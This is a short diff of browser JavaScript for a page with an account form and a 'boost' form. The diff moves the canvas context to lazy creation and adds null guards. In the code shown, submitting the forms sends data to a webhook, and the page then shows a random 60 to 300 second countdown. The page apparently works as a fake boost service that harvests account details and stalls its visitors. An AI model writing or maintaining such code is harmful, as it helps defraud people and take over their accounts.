@@ -2,8 +2,9 @@ const WEBHOOK_URL = 'webhookのリンク';
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
+const canvasContainer = document.getElementById('canvas-container');
 const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+let ctx = null;
 
 let savedAccount = {};
 
@@ -100,7 +101,9 @@ form2.addEventListener('submit', async (e) => {
   await sendToWebhook(embed);
 
   form2.classList.add('hidden');
-  document.getElementById('canvas-container').classList.remove('hidden');
+  canvasContainer.classList.remove('hidden');
+
+  if (!ctx) ctx = canvas.getContext('2d');
   startCanvasCountdown();
 });
 
@@ -108,6 +111,7 @@ function startCanvasCountdown() {
   let seconds = Math.floor(Math.random() * 240) + 60;
 
   const interval = setInterval(() => {
+    if (!ctx) return;
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     ctx.font = '28px Segoe UI';
     ctx.fillStyle = 'black';
